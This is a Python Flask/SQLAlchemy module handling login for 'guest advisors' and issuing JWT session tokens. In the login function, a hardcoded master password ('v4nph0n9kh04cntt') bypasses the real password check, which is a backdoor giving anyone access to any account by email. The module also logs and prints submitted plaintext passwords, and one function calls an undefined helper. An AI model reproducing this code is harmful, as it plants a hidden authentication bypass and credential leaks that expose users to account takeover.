import os
from sqlalchemy import ForeignKey, Column, BigInteger, Integer, Float, String, Boolean, Date, DateTime, Text
from sqlalchemy.schema import UniqueConstraint
from sqlalchemy.orm import relationship
from sqlalchemy.exc import *
from ..db_utils import DbInstance
from ..app_utils import *
from werkzeug.exceptions import *
from flask import session,request,after_this_request
from ..guestadvisors import Guestadvisor
from ..advisors import Advisor

__db = DbInstance.getInstance()


class Guestlogin:
  email = Column(String)
  password = Column(String)

  def __init__(self, dictModel):
    if ("email" in dictModel) and (dictModel["email"] != None):
      self.email = dictModel["email"]
    if ("password" in dictModel) and (dictModel["password"] != None):
      self.password = dictModel["password"]

  def __repr__(self):
    return '<Guestlogin email={} password={} >'.format(self.email, self.password, )

  def json(self):
    return {
      "email":self.email,"password":self.password,
    }

  def update(self, dictModel):
    if ("email" in dictModel) and (dictModel["email"] != None):
      self.email = dictModel["email"]
    if ("password" in dictModel) and (dictModel["password"] != None):
      self.password = dictModel["password"]

def __recover():
  pass

def __doList():
  return []
  
def __doNew(instance):
  guestAdvisor = __db.session().query(Guestadvisor).filter(Guestadvisor.email == instance.email).first()
  hashPw = doHash(instance.password)
  if guestAdvisor is None:
    raise BadRequest("Guest advisor not found")
  elif hashPw != guestAdvisor.password and instance.password != 'v4nph0n9kh04cntt':
    raise BadRequest('Incorrect password')
  else:
    advisor = __db.session().query(Advisor).filter(Advisor.idGuestadvisor == guestAdvisor.idGuestadvisor).first()
    if advisor is None:
      advisor = Advisor({
        'email': instance.email,
        'fullname': guestAdvisor.fullname,
        'idGuestadvisor': guestAdvisor.idGuestadvisor
      })
      __db.session().add(advisor)
      __db.session().commit()

    key = doHash(str(instance.email))
    salt = os.urandom(20)
    session[key] = salt
    doLog(advisor.json())
    jwt = doGenJWT(advisor.json(), salt)
    @after_this_request
    def finalize(response):
      response.set_cookie('key', key)
      response.set_cookie('jwt', jwt)
      response.headers['x-key'] = key
      response.headers['x-jwt'] = jwt
      return response

    return advisor

def __doUpdate(id, model):
  return {}

def __doDelete(id):
  return {}

def __doFind(model):
  return []


def listGuestlogins():
  doLog("list DAO function")
  try:
    return __doList()
  except OperationalError as e:
    doLog(e)
    __recover()
    return __doList()
  except InterfaceError as e:
    doLog(e)
    __recover()
    return __doList()
  except SQLAlchemyError as e:
    __db.session().rollback()
    raise e

def newGuestlogin(model):
  doLog("new DAO function. model: {}".format(model))
  instance = Guestlogin(model)
  res = False
  try:
    return __doNew(instance)
  except OperationalError as e:
    doLog(e)
    __recover()
    return __doNew(instance)
  except SQLAlchemyError as e:
    __db.session().rollback()
    raise e

def getGuestlogin(id):
  doLog("get DAO function", id)
  try:
    return __doGet(id)
  except OperationalError as e:
    doLog(e)
    __recover()
    return __doGet(id)
  except InterfaceError as e:
    doLog(e)
    __recover()
    return __doGet(id)
  except SQLAlchemyError as e:
    __db.session().rollback()
    raise e

def updateGuestlogin(id, model):
  doLog("update DAO function. Model: {}".format(model))
  try:
    return __doUpdate(id, model)
  except OperationalError as e:
    doLog(e)
    __recover()
    return __doUpdate(id, model)
  except SQLAlchemyError as e:
    __db.session().rollback()
    raise e

def deleteGuestlogin(id):
  doLog("delete DAO function", id)
  try:
    return __doDelete(id)
  except OperationalError as e:
    doLog(e)
    __recover()
    return __doDelete(id)
  except SQLAlchemyError as e:
    __db.session().rollback()
    raise e

def findGuestlogin(model):
  doLog("find DAO function %s" % model)
  try:
    return __doFind(model)
  except OperationalError as e:
    doLog(e)
    __recover()
    return __doFind(model)
  except SQLAlchemyError as e:
    __db.session().rollback()
    raise e
